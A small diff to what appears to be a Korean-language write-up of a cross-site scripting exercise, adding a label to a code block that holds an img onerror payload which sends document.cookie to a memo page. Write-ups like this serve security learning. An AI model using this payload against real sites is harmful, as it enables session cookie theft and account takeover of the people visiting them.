@@ -52,6 +52,7 @@ onerror 를 이용해서 alert 창의 실행을 성공했다.
 <br><br>
 ![10](https://user-images.githubusercontent.com/73854324/158143450-da728bc0-1620-4bcf-8169-f4b0113832cb.png)<br>
 ```
+주입 구문
 <img src="/" onerror="location.href='/memo?memo='+document.cookie">
 ```
 
